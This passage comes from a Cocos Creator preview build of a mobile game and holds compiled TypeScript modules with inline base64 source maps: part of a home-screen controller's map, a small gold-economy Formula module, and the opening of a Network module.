xlTm9kZSk7XHJcbiAgICAgICAgICAgICAgICAvKiogZ3VpZGVTa2UgKi9cclxuICAgICAgICAgICAgICAgIGxldCBndWlkZVNrZVByZWZhYiA9IGNjLmxvYWRlci5nZXRSZXMoXCJwcmVmYWIvZ3VpZGVTa2VcIik7XHJcbiAgICAgICAgICAgICAgICBsZXQgZ3VpZGVTa2VOb2RlID0gY2MuaW5zdGFudGlhdGUoZ3VpZGVTa2VQcmVmYWIpO1xyXG4gICAgICAgICAgICAgICAgZ3VpZGVTa2VOb2RlLnBvc2l0aW9uID0gY2MudjIoKTtcclxuICAgICAgICAgICAgICAgIG5ld2JpZU5vZGUuYWRkQ2hpbGQoZ3VpZGVTa2VOb2RlKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAvKmlmIChPbmNlRmxhZyl7XHJcbiAgICAgICAgICAgICAgICBpZiAoIVdvcmxkLk15Lm5ld2JpZXMuc3RhdGUoXCJGaXJzdFJvbGVVcFwiKSl7XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IG5ld2JpZU5vZGUgPSBuZXcgY2MuTm9kZSgpO1xyXG4gICAgICAgICAgICAgICAgICAgIG5ld2JpZU5vZGUubmFtZSA9IFwibmV3YmllTm9kZVwiO1xyXG4gICAgICAgICAgICAgICAgICAgIG5ld2JpZU5vZGUucG9zaXRpb24gPSB0aGlzLnJvbGVIZWFkTm9kZS5jb252ZXJ0VG9Xb3JsZFNwYWNlQVIoY2MudjIoKSk7XHJcbiAgICAgICAgICAgICAgICAgICAgY2MuZGlyZWN0b3IuZ2V0U2NlbmUoKS5hZGRDaGlsZChuZXdiaWVOb2RlKTtcclxuICAgICAgICAgICAgICAgICAgICAvISoqIGd1aWRlQ2lyY2xlICohL1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBndWlkZUNpcmNsZVByZWZhYiA9IGNjLmxvYWRlci5nZXRSZXMoXCJwcmVmYWIvZ3VpZGVDaXJjbGVcIik7XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IGd1aWRlQ2lyY2xlTm9kZSA9IGNjLmluc3RhbnRpYXRlKGd1aWRlQ2lyY2xlUHJlZmFiKTtcclxuICAgICAgICAgICAgICAgICAgICBndWlkZUNpcmNsZU5vZGUucG9zaXRpb24gPSBjYy52MigpO1xyXG4gICAgICAgICAgICAgICAgICAgIG5ld2JpZU5vZGUuYWRkQ2hpbGQoZ3VpZGVDaXJjbGVOb2RlKTtcclxuICAgICAgICAgICAgICAgICAgICAvISoqIGd1aWRlU2tlICohL1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBndWlkZVNrZVByZWZhYiA9IGNjLmxvYWRlci5nZXRSZXMoXCJwcmVmYWIvZ3VpZGVTa2VcIik7XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IGd1aWRlU2tlTm9kZSA9IGNjLmluc3RhbnRpYXRlKGd1aWRlU2tlUHJlZmFiKTtcclxuICAgICAgICAgICAgICAgICAgICBndWlkZVNrZU5vZGUucG9zaXRpb24gPSBjYy52MigpO1xyXG4gICAgICAgICAgICAgICAgICAgIG5ld2JpZU5vZGUuYWRkQ2hpbGQoZ3VpZGVTa2VOb2RlKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSovXHJcbiAgICAgICAgICAgIHRoaXMuYmxvY2tOb2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG5cclxuICAgICAgICAgICAgaWYgKCFjYy5kaXJlY3Rvci5nZXRTY2VuZSgpLmdldENoaWxkQnlOYW1lKFwibmV3YmllTm9kZVwiKSl7XHJcbiAgICAgICAgICAgICAgICBpZiAoIU9uY2VGbGFnIHx8IFNob3dDb3VudCUzID09PSAyKXtcclxuICAgICAgICAgICAgICAgICAgICBTaG93Q291bnQgPSAwO1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBzaG93ID0gdHJ1ZTtcclxuICAgICAgICAgICAgICAgICAgICBsZXQgdW5sb2NrcyA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLlByb3ApLmZpbHRlcih2YWx1ZSA9PiB2YWx1ZVsnaWQnXSAhPSA3ICYmIHZhbHVlWydpZCddICE9IDggJiYgdmFsdWVbJ2lkJ10gIT0gMTAgJiYgdmFsdWVbJ3VubG9jayddICE9IDApXHJcbiAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaXRlbSBvZiB1bmxvY2tzKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYoV29ybGQuTXkucHJvcEluZm8uYmVVc2luZyhpdGVtWydpZCddKSl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaG93ID0gZmFsc2U7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICBpZiAoc2hvdyl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMuYmxvY2tOb2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMubm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MuZGVsYXlUaW1lKDAuNSksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBGYWNhZGUuZXhlY3V0ZUNvbW1hbmQoXCJPcGVuVmlld0NvbW1hbmRcIiwgXCJwcmVmYWIvcmVjb21tZW5kUHJvcHNcIik7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aGlzLmJsb2NrTm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfSkpKTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgICAgICAgICAgU2hvd0NvdW50Kys7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9KTtcclxuICAgIH1cclxuXHJcbiAgICBwbGF5RXhpdCgpe1xyXG4gICAgICAgIHRoaXMuYmxvY2tOb2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgbGV0IG5ld2JpZU5vZGUgPSBjYy5kaXJlY3Rvci5nZXRTY2VuZSgpLmdldENoaWxkQnlOYW1lKFwibmV3YmllTm9kZVwiKTtcclxuICAgICAgICBpZiAobmV3YmllTm9kZSl7XHJcbiAgICAgICAgICAgIG5ld2JpZU5vZGUuZGVzdHJveSgpO1xyXG4gICAgICAgICAgICBXb3JsZC5NeS5uZXdiaWVzLmZpbmlzaChcIkZpcnN0RW50cnlIb21lXCIpO1xyXG4gICAgICAgIH1cclxuICAgICAgICBGYWNhZGUuZXhlY3V0ZUNvbW1hbmQoXCJMb2FkU2NlbmVDb21tYW5kXCIsIFwiR2FtZVNjZW5lXCIpO1xyXG4gICAgICAgIC8qbGV0IHdoaXRlTm9kZSA9IHRoaXMud2hpdGVOb2RlO1xyXG4gICAgICAgIHdoaXRlTm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgIHdoaXRlTm9kZS5yZW1vdmVGcm9tUGFyZW50KGZhbHNlKTtcclxuICAgICAgICBjYy5kaXJlY3Rvci5nZXRTY2VuZSgpLmFkZENoaWxkKHdoaXRlTm9kZSk7XHJcbiAgICAgICAgd2hpdGVOb2RlLnBvc2l0aW9uID0gY2MudmlzaWJsZVJlY3QuY2VudGVyO1xyXG4gICAgICAgIHdoaXRlTm9kZS5vcGFjaXR5ID0gMDtcclxuICAgICAgICB3aGl0ZU5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLmZhZGVUbygwLjUsIDI1NSksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgIEZhY2FkZS5leGVjdXRlQ29tbWFuZChcIkxvYWRTY2VuZUNvbW1hbmRcIiwgXCJHYW1lU2NlbmVcIik7XHJcbiAgICAgICAgfSksIGNjLmRlbGF5VGltZSgwLjIpLCBjYy5mYWRlVG8oMC41LCAwKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgd2hpdGVOb2RlLmRlc3Ryb3koKTtcclxuICAgICAgICB9KSkpOyovXHJcbiAgICAgICAgLypsZXQgcHJvbWlzZXMgPSBbXTtcclxuICAgICAgICBsZXQgc3BlZWQgPSA3MDA7XHJcbiAgICAgICAgbGV0IGRpc3RhbmNlID0gMjUwICsgdGhpcy50b3BOb2RlLmhlaWdodC8yO1xyXG4gICAgICAgIGlmKGV4dC5pc0lwaG9uZVgpe1xyXG4gICAgICAgICAgICBkaXN0YW5jZSArPSA2NjtcclxuICAgICAgICB9XHJcbiAgICAgICAgbGV0IG1vdmVTcGVlZCA9IDEyMDA7XHJcbiAgICAgICAgZm9yIChsZXQgaT0wOyBpPHRoaXMuYm90dG9tTGF5ZXJzLmxlbmd0aDsgaSsrKXtcclxuICAgICAgICAgICAgbGV0IG5vZGUgPSB0aGlzLmJvdHRvbUxheWVyc1tpXTtcclxuICAgICAgICAgICAgbm9kZS5zdG9wQWxsQWN0aW9ucygpO1xyXG4gICAgICAgICAgICBwcm9taXNlcy5wdXNoKG5vZGUucnVuQWN0aW9uQXdhaXQoY2MubW92ZVRvKE1hdGguYWJzKG5vZGUueSAtIG5vZGUuaGVpZ2h0LzIrIHRoaXMuYm90dG9tTm9kZS5oZWlnaHQvMikvbW92ZVNwZWVkLCBjYy52MigwLCAtbm9kZS5oZWlnaHQvMiArIHRoaXMuYm90dG9tTm9kZS5oZWlnaHQvMikpKSlcclxuICAgICAgICB9XHJcbiAgICAgICAgcHJvbWlzZXMucHVzaCh0aGlzLnRvcE5vZGUucnVuQWN0aW9uQXdhaXQoY2MubW92ZUJ5KGRpc3RhbmNlL3NwZWVkLCBjYy52MigwLCBkaXN0YW5jZSkpKSk7XHJcbiAgICAgICAgcHJvbWlzZXMucHVzaCh0aGlzLmJvdHRvbU5vZGUucnVuQWN0aW9uQXdhaXQoY2MubW92ZUJ5KHRoaXMuYm90dG9tTm9kZS5oZWlnaHQvc3BlZWQsIGNjLnYyKDAsIC10aGlzLmJvdHRvbU5vZGUuaGVpZ2h0KSkpKTtcclxuICAgICAgICBwcm9taXNlcy5wdXNoKHRoaXMucmlnaHROb2RlLnJ1bkFjdGlvbkF3YWl0KGNjLm1vdmVCeSgyMDAvc3BlZWQsIGNjLnYyKDIwMCwgMCkpKSk7XHJcbiAgICAgICAgcHJvbWlzZXMucHVzaCh0aGlzLmNlbnRlck5vZGUucnVuQWN0aW9uQXdhaXQoY2MubW92ZVRvKGNjLnZpZXcuZ2V0VmlzaWJsZVNpemUoKS53aWR0aC9zcGVlZCwgY2MudjIoLWNjLnZpZXcuZ2V0VmlzaWJsZVNpemUoKS53aWR0aCwgMCkpKSk7XHJcbiAgICAgICAgUHJvbWlzZS5hbGwocHJvbWlzZXMpLnRoZW4ocmVzPT57XHJcbiAgICAgICAgICAgIHRoaXMubm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2Muc2NhbGVUbygxLCAxLzAuNCksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgICAgICAvL+WIh+aNouWcuuaZr1xyXG4gICAgICAgICAgICAgICAgRmFjYWRlLmV4ZWN1dGVDb21tYW5kKFwiTG9hZFNjZW5lQ29tbWFuZFwiLCBcIkdhbWVTY2VuZVwiKTtcclxuICAgICAgICAgICAgfSkpKTtcclxuICAgICAgICB9KTsqL1xyXG4gICAgfVxyXG5cclxuICAgIG9uVG9nZ2xlRXZlbnQodG9nZ2xlLCBkYXRhKXtcclxuICAgICAgICBkYXRhID0gcGFyc2VJbnQoZGF0YSk7XHJcbiAgICAgICAgLy8gY29uc29sZS5sb2codG9nZ2xlLm5vZGUubmFtZSwgdG9nZ2xlLmlzQ2hlY2tlZCk7XHJcbiAgICAgICAgLyoqIOWFtuS7luWvueixoeWFs+mXre+8jOeEtuWQjuWGjeWkhOeQhuiHquW3sSAqL1xyXG4gICAgICAgIGxldCBtb3ZlU3BlZWQgPSAxMjAwO1xyXG4gICAgICAgIGxldCBwcm9taXNlcyA9IFtdO1xyXG4gICAgICAgIGZvciAobGV0IGk9MDsgaTx0aGlzLmJvdHRvbUxheWVycy5sZW5ndGg7IGkrKyl7XHJcbiAgICAgICAgICAgIGxldCBub2RlID0gdGhpcy5ib3R0b21MYXllcnNbaV07XHJcbiAgICAgICAgICAgIG5vZGUuc3RvcEFsbEFjdGlvbnMoKTtcclxuICAgICAgICAgICAgaWYgKGkgIT0gZGF0YSAtIDEpe1xyXG4gICAgICAgICAgICAgICAgcHJvbWlzZXMucHVzaChub2RlLnJ1bkFjdGlvbkF3YWl0KGNjLm1vdmVUbyhNYXRoLmFicyhub2RlLnkgLSBub2RlLmhlaWdodC8yKyB0aGlzLmJvdHRvbU5vZGUuaGVpZ2h0LzIpL21vdmVTcGVlZCwgY2MudjIoMCwgLW5vZGUuaGVpZ2h0LzIgKyB0aGlzLmJvdHRvbU5vZGUuaGVpZ2h0LzIpKSkpXHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICAgICAgbGV0IG5vZGUgPSB0aGlzLmJvdHRvbUxheWVyc1tkYXRhLTFdO1xyXG4gICAgICAgIGxldCBkZXN0UG9zID0gY2MudjIoMCwgLSBub2RlLmhlaWdodC8yKyB0aGlzLmJvdHRvbU5vZGUuaGVpZ2h0LzIpO1xyXG4gICAgICAgIGlmICh0b2dnbGUuaXNDaGVja2VkKXtcclxuICAgICAgICAgICAgZGVzdFBvcy55ID0gbm9kZS5oZWlnaHQvMiArIHRoaXMuYm90dG9tTm9kZS5oZWlnaHQvMjtcclxuICAgICAgICAgICAgdGhpcy51cEljb25Ob2Rlcy5mb3JFYWNoKHZhbHVlID0+IHZhbHVlLmFjdGl2ZSA9IGZhbHNlKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgaWYgKChkYXRhID09IDIgJiYgIXRvZ2dsZS5pc0NoZWNrZWQpIHx8IGRhdGEgIT0gMil7XHJcbiAgICAgICAgICAgIHRoaXMuc3RhcnRHYW1lTm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgICAgICB0aGlzLndlYXBvblN0YXJ0Tm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICB9XHJcbiAgICAgICAgcHJvbWlzZXMucHVzaChub2RlLnJ1bkFjdGlvbkF3YWl0KGNjLm1vdmVUbyhNYXRoLmFicyhkZXN0UG9zLnkgLSBub2RlLnkpL21vdmVTcGVlZCwgZGVzdFBvcykpKTtcclxuICAgICAgICBQcm9taXNlLmFsbChwcm9taXNlcykudGhlbihyZXM9PntcclxuICAgICAgICAgICAgY29uc29sZS5sb2coXCJmaW5pc2guXCIpO1xyXG4gICAgICAgICAgICBpZiAoIXRvZ2dsZS5pc0NoZWNrZWQpe1xyXG4gICAgICAgICAgICAgICAgdGhpcy5zaG93VXBJY29uKCk7XHJcbiAgICAgICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgICAgIGlmIChkYXRhID09IDIpe1xyXG4gICAgICAgICAgICAgICAgICAgIHRoaXMuc3RhcnRHYW1lTm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICAgICAgICAgICAgICB0aGlzLndlYXBvblN0YXJ0Tm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBpZiAoZGF0YSA9PSAxKXtcclxuICAgICAgICAgICAgICAgIGxldCBuZXdiaWVOb2RlID0gY2MuZGlyZWN0b3IuZ2V0U2NlbmUoKS5nZXRDaGlsZEJ5TmFtZShcIm5ld2JpZU5vZGVcIik7XHJcbiAgICAgICAgICAgICAgICBpZiAobmV3YmllTm9kZSl7XHJcbiAgICAgICAgICAgICAgICAgICAgdGhpcy5ibG9ja05vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICAgICAgICAgICAgICBuZXdiaWVOb2RlLmdldENoaWxkQnlOYW1lKFwiZ3VpZGVTa2VcIikuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgICAgICAgICAgICAgbmV3YmllTm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MubW92ZVRvKDAuNSwgdGhpcy5maWdodEJ1dHRvbk5vZGUuY29udmVydFRvV29ybGRTcGFjZUFSKGNjLnYyKCkpKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5ibG9ja05vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIG5ld2JpZU5vZGUuZ2V0Q2hpbGRCeU5hbWUoXCJndWlkZVNrZVwiKS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgICAgIH0pKSlcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuICAgIHByaXZhdGUgc2hvd1VwSWNvbigpe1xyXG4gICAgICAgIHRoaXMudXBJY29uTm9kZXMuZm9yRWFjaCh2YWx1ZSA9PiB2YWx1ZS5hY3RpdmUgPSB0cnVlKTtcclxuICAgICAgICBsZXQgd2VhcG9uQ29uZmlnID0gRXhjZWxDb25maWcuZ2V0RXhjZWxUYWJsZShFeGNlbFRhYmxlTmFtZXMuV2VhcG9uKTtcclxuICAgICAgICBsZXQgY29uZmlnID0gd2VhcG9uQ29uZmlnWzBdO1xyXG4gICAgICAgIGxldCB3ZWFwb25VcENvbmZpZyA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLldlYXBvblVwKTtcclxuICAgICAgICBsZXQgaHBDYW5VcCA9IFdvcmxkLlN0b3JhZ2UuSHBMdiA8IGNvbmZpZ1snbHZfbGltaXQnXSAmJiBXb3JsZC5TdG9yYWdlLmdvbGRDb3VudCA+PSB3ZWFwb25VcENvbmZpZ1tXb3JsZC5TdG9yYWdlLkhwTHYtMV1bJ2xpZmVfZXhwZW5kJ107XHJcbiAgICAgICAgbGV0IGFkQ2FuVXAgPSBXb3JsZC5TdG9yYWdlLkFETHYgPCBjb25maWdbJ2x2X2xpbWl0J10gJiYgV29ybGQuU3RvcmFnZS5nb2xkQ291bnQgPj0gd2VhcG9uVXBDb25maWdbV29ybGQuU3RvcmFnZS5BREx2LTFdWydsaWZlX2V4cGVuZCddO1xyXG4gICAgICAgIHRoaXMudXBJY29uTm9kZXNbMF0uYWN0aXZlID0gaHBDYW5VcCB8fCBhZENhblVwO1xyXG5cclxuICAgICAgICB0aGlzLnVwSWNvbk5vZGVzWzFdLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIGZvciAobGV0IGk9MTsgaTx3ZWFwb25Db25maWcubGVuZ3RoOyBpKyspe1xyXG4gICAgICAgICAgICBsZXQgY2ZnID0gd2VhcG9uQ29uZmlnW2ldO1xyXG4gICAgICAgICAgICBsZXQgYkxvY2sgPSBXb3JsZC5TdG9yYWdlLmdhbWVMZXZlbCA8IGNmZ1sndW5sb2NrJ107XHJcbiAgICAgICAgICAgIGxldCBmaXJlUG93ZXJMdiA9IFdvcmxkLk15LmFybW9yeS5sZXZlbE9mRW1pdHRlckZpcmVQb3dlcihjZmdbJ2lkJ10pO1xyXG4gICAgICAgICAgICBsZXQgZmlyZUNhblVwID0gZmlyZVBvd2VyTHYgPCBjZmdbJ2x2X2xpbWl0J10gJiYgV29ybGQuU3RvcmFnZS5nb2xkQ291bnQgPj0gd2VhcG9uVXBDb25maWdbZmlyZVBvd2VyTHYtMV1bJ2ZpcmVfZXhwZW5kJ107XHJcbiAgICAgICAgICAgIGxldCBwb3dlckx2ID0gV29ybGQuTXkuYXJtb3J5LmxldmVsT2ZFbWl0dGVyUG93ZXIoY2ZnWydpZCddKTtcclxuICAgICAgICAgICAgbGV0IHBvd2VyQ2FuVXAgPSBwb3dlckx2IDwgY2ZnWydsdl9saW1pdCddICYmIFdvcmxkLlN0b3JhZ2UuZ29sZENvdW50ID49IHdlYXBvblVwQ29uZmlnW3Bvd2VyTHYtMV1bJ3Bvd2VyX2V4cGVuZCddO1xyXG4gICAgICAgICAgICBpZiAoIWJMb2NrICYmIChmaXJlQ2FuVXAgfHwgcG93ZXJDYW5VcCkpe1xyXG4gICAgICAgICAgICAgICAgdGhpcy51cEljb25Ob2Rlc1sxXS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIGxldCBnb2xkVXBDb25maWcgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5Hb2xkVXApO1xyXG4gICAgICAgIGxldCBnb2xkQ2FuVXAgPSBXb3JsZC5TdG9yYWdlLmdvbGRMdiA8IGdvbGRVcENvbmZpZy5sZW5ndGggJiYgV29ybGQuU3RvcmFnZS5nb2xkQ291bnQgPj0gZ29sZFVwQ29uZmlnW1dvcmxkLlN0b3JhZ2UuZ29sZEx2LTFdWydndmFsdWVfZXhwZW5kJ107XHJcbiAgICAgICAgbGV0IGVhcm5DYW5VcCA9IFdvcmxkLlN0b3JhZ2UuZGF5RWFybkx2IDwgZ29sZFVwQ29uZmlnLmxlbmd0aCAmJiBXb3JsZC5TdG9yYWdlLmdvbGRDb3VudCA+PSBnb2xkVXBDb25maWdbV29ybGQuU3RvcmFnZS5kYXlFYXJuTHYtMV1bJ29uX2hvb2tfZXhwZW5kJ107XHJcbiAgICAgICAgdGhpcy51cEljb25Ob2Rlc1syXS5hY3RpdmUgPSBnb2xkQ2FuVXAgfHwgZWFybkNhblVwO1xyXG4gICAgfVxyXG5cclxuICAgIG9uVG91Y2hCRyhldmVudCwgZGF0YSl7XHJcbiAgICAgICAgaWYgKCF0aGlzLndlYXBvblN0YXJ0Tm9kZS5hY3RpdmUpe1xyXG4gICAgICAgICAgICBsZXQgbmV3YmllTm9kZSA9IGNjLmRpcmVjdG9yLmdldFNjZW5lKCkuZ2V0Q2hpbGRCeU5hbWUoXCJuZXdiaWVOb2RlXCIpO1xyXG4gICAgICAgICAgICBpZiAobmV3YmllTm9kZSl7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnBsYXlFeGl0KCk7XHJcbiAgICAgICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgICAgIEZhY2FkZS5leGVjdXRlQ29tbWFuZChcIk9wZW5WaWV3Q29tbWFuZFwiLCBcInByZWZhYi9yZWNvbW1lbmRcIik7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgb25DbGlja1dlYXBvblN0YXJ0KGV2ZW50LCBkYXRhKXtcclxuICAgICAgICBjb25zb2xlLmxvZyhcIuOAkHZpZGVv44CROCDpq5jniIbmrablmajlvIDlsYDjgJBjbGlja+OAkUhvbWVDb250cm9sbGVyIFdlYXBvblN0YXJ0XCIpXHJcblxyXG4gICAgICAgIFdvcmxkLlN0b3JhZ2UuX3ZpZGVvU2lnbj04XHJcbiAgICAgICAgV29ybGQuU3RvcmFnZS52aWRlb0FkX3Nob3coKSBcclxuICAgIH1cclxuXHJcbiAgICBvbkNsaWNrV2VhcG9uU3RhcnREbygpe1xyXG4gICAgICAgIEdhbWVQcm94eS5wcmVwYXJlR3VuID0gdGhpcy53ZWFwb25MYXllckNvbnRyb2xsZXIuZm9jdXNHdW5JRCgpO1xyXG4gICAgICAgIHRoaXMucGxheUV4aXQoKTtcclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/info/Formula.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '62f6aU/jHhCg7Y1stBnDERq', 'Formula');
// script/app/info/Formula.ts

Object.defineProperty(exports, "__esModule", { value: true });
exports.Formula = void 0;
/** 公式模块 */
var Formula;
(function (Formula) {
    /** 金币 */
    var Gold = /** @class */ (function () {
        function Gold() {
        }
        /** 金币价值 */
        Gold.goldCost = function (lv, maxLv, cost) {
            if (lv > maxLv) {
                return cost + (lv - maxLv);
            }
            else {
                return cost;
            }
        };
        /** 日常收益 */
        Gold.dayGet = function (lv) {
            return Math.floor(lv * 1.8);
        };
        /** 升级消耗 */
        Gold.upgradeCost = function (lv) {
            return lv * 120;
        };
        return Gold;
    }());
    Formula.Gold = Gold;
})(Formula = exports.Formula || (exports.Formula = {}));

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2luZm8vRm9ybXVsYS50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7OztBQUNBLFdBQVc7QUFDWCxJQUFjLE9BQU8sQ0F1QnBCO0FBdkJELFdBQWMsT0FBTztJQUNqQixTQUFTO0lBQ1Q7UUFBQTtRQW1CQSxDQUFDO1FBbEJHLFdBQVc7UUFDRyxhQUFRLEdBQXRCLFVBQXVCLEVBQVMsRUFBRSxLQUFZLEVBQUUsSUFBVztZQUN2RCxJQUFJLEVBQUUsR0FBRyxLQUFLLEVBQUM7Z0JBQ1gsT0FBTyxJQUFJLEdBQUcsQ0FBQyxFQUFFLEdBQUcsS0FBSyxDQUFDLENBQUM7YUFDOUI7aUJBQU07Z0JBQ0gsT0FBTyxJQUFJLENBQUM7YUFDZjtRQUNMLENBQUM7UUFFRCxXQUFXO1FBQ0csV0FBTSxHQUFwQixVQUFxQixFQUFTO1lBQzFCLE9BQU8sSUFBSSxDQUFDLEtBQUssQ0FBQyxFQUFFLEdBQUcsR0FBRyxDQUFDLENBQUM7UUFDaEMsQ0FBQztRQUVELFdBQVc7UUFDRyxnQkFBVyxHQUF6QixVQUEwQixFQUFTO1lBQy9CLE9BQU8sRUFBRSxHQUFHLEdBQUcsQ0FBQztRQUNwQixDQUFDO1FBQ0wsV0FBQztJQUFELENBbkJBLEFBbUJDLElBQUE7SUFuQlksWUFBSSxPQW1CaEIsQ0FBQTtBQUVMLENBQUMsRUF2QmEsT0FBTyxHQUFQLGVBQU8sS0FBUCxlQUFPLFFBdUJwQiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG4vKiog5YWs5byP5qih5Z2XICovXHJcbmV4cG9ydCBtb2R1bGUgRm9ybXVsYSB7XHJcbiAgICAvKiog6YeR5biBICovXHJcbiAgICBleHBvcnQgY2xhc3MgR29sZCB7XHJcbiAgICAgICAgLyoqIOmHkeW4geS7t+WAvCAqL1xyXG4gICAgICAgIHB1YmxpYyBzdGF0aWMgZ29sZENvc3QobHY6bnVtYmVyLCBtYXhMdjpudW1iZXIs44CAY29zdDpudW1iZXIpOm51bWJlcntcclxuICAgICAgICAgICAgaWYgKGx2ID4gbWF4THYpe1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuIGNvc3QgKyAobHYgLSBtYXhMdik7XHJcbiAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gY29zdDtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgLyoqIOaXpeW4uOaUtuebiiAqL1xyXG4gICAgICAgIHB1YmxpYyBzdGF0aWMgZGF5R2V0KGx2Om51bWJlcik6bnVtYmVye1xyXG4gICAgICAgICAgICByZXR1cm4gTWF0aC5mbG9vcihsdiAqIDEuOCk7XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICAvKiog5Y2H57qn5raI6ICXICovXHJcbiAgICAgICAgcHVibGljIHN0YXRpYyB1cGdyYWRlQ29zdChsdjpudW1iZXIpOm51bWJlcntcclxuICAgICAgICAgICAgcmV0dXJuIGx2ICogMTIwO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/network/Network.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'f782cknxKBOBY6HpYDQ16Ji', 'Network');
// script/app/network/Network.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
